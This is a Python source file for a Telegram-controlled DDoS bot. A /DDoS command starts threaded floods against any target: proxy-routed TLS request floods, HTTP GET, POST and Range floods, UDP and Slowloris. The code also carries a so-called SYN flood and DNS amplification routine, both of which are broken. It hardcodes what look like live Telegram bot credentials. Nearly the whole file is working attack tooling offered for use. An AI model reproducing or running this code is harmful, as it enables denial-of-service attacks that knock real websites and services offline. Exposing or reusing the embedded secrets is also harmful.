import ssl
from pyrogram import Client
from pyrogram import filters
import requests
import threading
import argparse
import os
import time
import cloudscraper
from colorama import Fore
from random import choice as che
from random import randint as ran
from random import _urandom as byt
from certifi import where
from ssl import CERT_NONE, SSLContext, create_default_context
from threading import Thread as thr
from http.client import HTTPResponse as httpr
from requests import get
from urllib.parse import urlparse
from datetime import datetime, timedelta
from requests_html import HTMLSession
import subprocess
from colorama import init as colorama_init
import socket
import random
import string


def generate_random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def generate_random_ip():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

def generate_random_payload(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def syn_flood(target_url, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_url, target_port))
            s.send(b'GET / HTTP/1.1\r\n')
            s.send(b'Host: example.com\r\n\r\n')
            s.close()
        except:
            pass

def http_flood(target_url, target_port):
    while True:
        try:
            headers = {'User-Agent': generate_random_string(50), 'Connection': 'close'}
            requests.get(f"http://{target_url}:{target_port}", headers=headers, timeout=1)
        except:
            pass

def udp_flood(target_url, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(generate_random_payload(1024).encode(), (target_url, target_port))
            s.close()
        except:
            pass

def slowloris(target_url, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_url, target_port))
            s.send(b'GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)).encode())
            s.send(b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n')
            s.send(b'Keep-Alive: timeout=10, max=1000\r\n')
            time.sleep(random.uniform(5, 15))
        except:
            pass

def dns_amplification(target_url):
    while True:
        try:
            dns_server = '8.8.8.8'
            query = 'www.example.com'
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'\x08\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + bytes(''.join(chr(random.randint(97, 122)) for _ in range(10)), 'utf-8') + b'\x00\x00\x01\x00\x01', (dns_server, 53))
            s.close()
            time.sleep(random.uniform(0.1, 0.5))
        except:
            pass

def http_post_flood(target_url, target_port):
    while True:
        try:
            headers = {'User-Agent': generate_random_string(50), 'Connection': 'close'}
            data = generate_random_payload(1024)
            requests.post(f"http://{target_url}:{target_port}", headers=headers, data=data, timeout=1)
        except:
            pass

def http_range_dos(target_url, target_port):
    while True:
        try:
            headers = {'User-Agent': generate_random_string(50), 'Connection': 'close', 'Range': f"bytes={random.randint(0, 1024)}-"}
            requests.get(f"http://{target_url}:{target_port}", headers=headers, timeout=1)
        except:
            pass

bot_token = "6891847784:AAFDEinLb4Jfm_MYg0itG5YzkL2RnY8XFp0"
api_id = "29073206"
api_hash = "9790d8e2dac10c7036d37c17de67618f"

app = Client("main_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

# Load proxies from file
def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = file.readlines()
    return [proxy.strip() for proxy in proxies]

proxies = load_proxies('proxy.txt')

# Function to get a random proxy
def get_random_proxy():
    return random.choice(proxies)

reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
]

ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

method = ""
url = ""
port = 0
threads = 0
rpc = 0

is_running = True
parsed_url = None
target = ""
ip = ""

def print_error(message, error):
    print(f"Error in {message}: {error}")

@app.on_message(filters.command("start"))
def start(_, message):
    global is_running
    is_running = True
    message.reply_text("ONLINE")

@app.on_message(filters.command("help"))
def help_command(_, message):
    help_text = (
        "Commands:\n"
        "/stop - Stop every action until you do /start\n"
        "/DDoS [method] [target] [port] [threads] [rpc] - Unleash the chaos!\n"
        "| METHODS | KILL+ - KILL - CFB - SYN - HTTP - UDP - SLOWLORIS - DNS - HTTP_POST - HTTP_RANGE\n"
        "/method - Show available attack methods\n"
        "/help - Show this message"
    )
    help2_text = "i'm offline"
    if is_running:
        message.reply_text(help_text)
    else:
        message.reply_text(help2_text)

@app.on_message(filters.command("stop"))
def stop_bot(_, message):
    stop_text = "Stopping every action..."
    global is_running
    is_running = False
    message.reply_text(stop_text)

@app.on_message(filters.command("DDoS"))
def ddos_command(_, message):
    global method, url, port, threads, rpc, parsed_url, target, ip
    if is_running:
        try:
            command_parts = message.text.split(" ")[1:]
            method, url, port, threads, rpc = command_parts
            parsed_url = urlparse(url)
            target = parsed_url.netloc
            ip = socket.gethostbyname(target)
            start_ddos(_, message)
        except Exception as e:
            print_error("ddos_command", e)
            message.reply_text(f"Error: {e}")
    else:
        message.reply_text("i can't attack i'm offline")

def start_ddos(_, message):
    global method, url, port, threads, rpc
    urlcheckhost = f"https://check-host.net/check-http?host={url}"
    mess = (
    "🟢 Attack sucessfully sent through all servers 🟢\n"
    "The Bot power need to be increase 🧨\n"
    f"⚪ Check-Host : {urlcheckhost}"
    )
    message.reply_text(mess)
    if method == "KILL" or method == "kill":
        for _ in range(int(threads)):
            t = threading.Thread(target=kill)
            t.start()
    elif method == "KILL+" or method == "kill+":
        for _ in range(int(threads)):
            t = threading.Thread(target=killplus)
            t.start()
    elif method == "CFB" or method == "cfb":
        for _ in range(int(threads)):
            t = threading.Thread(target=cfb)
            t.start()
    elif method == "SYN" or method == "syn":
        for _ in range(int(threads)):
            t = threading.Thread(target=syn_flood, args=(url, int(port)))
            t.start()
    elif method == "HTTP" or method == "http":
        for _ in range(int(threads)):
            t = threading.Thread(target=http_flood, args=(url, int(port)))
            t.start()
    elif method == "UDP" or method == "udp":
        for _ in range(int(threads)):
            t = threading.Thread(target=udp_flood, args=(url, int(port)))
            t.start()
    elif method == "SLOWLORIS" or method == "slowloris":
        for _ in range(int(threads)):
            t = threading.Thread(target=slowloris, args=(url, int(port)))
            t.start()
    elif method == "DNS" or method == "dns":
        for _ in range(int(threads)):
            t = threading.Thread(target=dns_amplification, args=(url,))
            t.start()
    elif method == "HTTP_POST" or method == "http_post":
        for _ in range(int(threads)):
            t = threading.Thread(target=http_post_flood, args=(url, int(port)))
            t.start()
    elif method == "HTTP_RANGE" or method == "http_range":
        for _ in range(int(threads)):
            t = threading.Thread(target=http_range_dos, args=(url, int(port)))
            t.start()

def kill():
    global target, port, rpc
    proxy = get_random_proxy()
    while is_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = ssl_context.wrap_socket(s, server_hostname=target)
            s.connect((proxy.split(':')[0], int(proxy.split(':')[1])))
            for _ in range(int(rpc)):
                payl = generate_payload1()
                s.send(payl)
        except Exception as e:
            print_error("kill", e)

def cfb():
    global target, port, rpc
    proxy = get_random_proxy()
    while is_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = ssl_context.wrap_socket(s, server_hostname=target)
            s.connect((proxy.split(':')[0], int(proxy.split(':')[1])))
            for _ in range(int(rpc)):
                payl = generate_payload3()
                s.send(payl)
        except Exception as e:
            print_error("cfb", e)

def killplus():
    global target, port, rpc
    proxy = get_random_proxy()
    while is_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = ssl_context.wrap_socket(s, server_hostname=target)
            s.connect((proxy.split(':')[0], int(proxy.split(':')[1])))
            for _ in range(int(rpc)):
                payl = generate_payload2()
                s.send(payl)
        except Exception as e:
            print_error("killplus", e)

def generate_payload1():
    global target, ua, reff
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(ua)}\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferre: {random.choice(reff)}\r\n\r\n'.encode(encoding='utf-8')

def generate_payload2():
    global target, ua
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(ua)}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nsec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\n\r\n'.encode(encoding='utf-8')

def generate_payload3():
    global target, ua
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(ua)}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n'.encode(encoding='utf-8')

def show_methods():
    methods = (
        "1. KILL/KILL+: TCP Flood",
        "2. CFB: Connection Flood",
        "3. SYN: SYN Flood",
        "4. HTTP: HTTP Flood",
        "5. UDP: UDP Flood",
        "6. SLOWLORIS: Slowloris Attack",
        "7. DNS: DNS Amplification",
        "8. HTTP_POST: HTTP POST Flood",
        "9. HTTP_RANGE: HTTP Range Header DoS"
    )
    return "\n".join(methods)

@app.on_message(filters.command("method"))
def method_command(_, message):
    method_list = show_methods()
    message.reply_text(f"Available methods:\n{method_list}")

app.run()
